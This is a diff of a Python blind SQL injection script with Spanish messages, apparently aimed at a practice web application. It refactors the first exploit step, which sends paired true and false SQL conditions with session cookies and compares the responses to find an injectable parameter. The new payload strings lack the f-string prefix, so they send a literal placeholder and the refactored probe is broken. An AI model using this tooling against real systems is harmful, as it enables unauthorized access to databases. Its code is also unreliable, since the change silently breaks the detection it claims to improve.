@@ -50,46 +50,23 @@ def paso_0(base_url, cookies):
     
     blind_sqli_vuln_type = "None"
     
-    while(blind_sqli_vuln_type == "None"):
-             
-        # Vulnerabilidad Blind SQL Injection con comillas simples
-        print("[INFO] Comprobando vulnerabilidad Blind SQL Injection con comillas simples...")
-        url1 = base_url + "1\' and 1=\'1" + "&Submit=Submit#"
-        url2 = base_url + "1\' and 1=\'0" + "&Submit=Submit#"    
+    # Comprobamos los diferentes tipos de vulnerabilidades SQL Injection
+    for vuln_type in ["\'", "\"", ""]:
+        print(f"[INFO] Comprobando vulnerabilidad Blind SQL Injection con: {vuln_type} ...")
+        url1 = base_url + "1{vuln_type} and 1={vuln_type}1" + "&Submit=Submit#"
+        url2 = base_url + "1{vuln_type} and 1={vuln_type}0" + "&Submit=Submit#"    
         r1 = requests.get(url1, cookies=cookies)
         r2 = requests.get(url2, cookies=cookies)
         if(r1.text != r2.text):
-            blind_sqli_vuln_type = "\'"
-            print(f'\033[92m[SUCCESS] ¡Vulnerabilidad Blind SQL Injection con comillas simples!\033[0m')
+            blind_sqli_vuln_type = vuln_type
+            print(f'\033[92m[SUCCESS] ¡¡Vulnerabilidad Blind SQL Injection con: {blind_sqli_vuln_type} !!\033[0m')
             break
         else:
-            print(f'\033[91m[FAILED] Vulnerabilidad no encontrada :(\033[0m')        
-
-        # Vulnerabilidad Blind SQL Injection con comillas simples
-        print("\n[INFO] Comprobando vulnerabilidad Blind SQL Injection con comillas dobles...")
-        url1 = base_url + "1\" and 1=\"1" + "&Submit=Submit#"
-        url2 = base_url + "1\" and 1=\"0" + "&Submit=Submit#"
-        r1 = requests.get(url1, cookies=cookies)
-        r2 = requests.get(url2, cookies=cookies)
-        if(r1.text != r2.text):
-            blind_sqli_vuln_type = "\""
-            print(f'\033[92m[SUCCESS] ¡Vulnerabilidad Blind SQL Injection con comillas dobles!\033[0m')
-            break
-        else:
-            print(f'\033[91m[FAILED] Vulnerabilidad no encontrada :(\033[0m')
-
-        # Vulnerabilidad Blind SQL Injection sin comillas simples ni comillas dobles
-        print("[INFO] Comprobando vulnerabilidad Blind SQL Injection sin comillas simples ni comillas dobles...")
-        url1 = base_url + "1 and 1=1" + "&Submit=Submit#"
-        url2 = base_url + "1 and 1=0" + "&Submit=Submit#"       
-        r1 = requests.get(url1, cookies=cookies)
-        r2 = requests.get(url2, cookies=cookies)
-        if(r1.text != r2.text):
-            blind_sqli_vuln_type = ""
-            print(f'\033[92m[SUCCESS] ¡Vulnerabilidad Blind SQL Injection sin comillas simples ni comillas dobles!\033[0m')
-            break
-        else:
-            print(f'\033[91m[FAILED] Vulnerabilidad no encontrada :(\033[0m')
+            print(f'\033[91m[FAILED] Vulnerabilidad no encontrada con {vuln_type}\033[0m')
+            
+    if(blind_sqli_vuln_type == "None"):
+        print(f'\033[91m[FAILED] No se han encontrado vulnerabilidades SQL Injection :(\n\t Saliendo del programa...\033[0m')
+        sys.exit(2)
 
     return blind_sqli_vuln_type
 
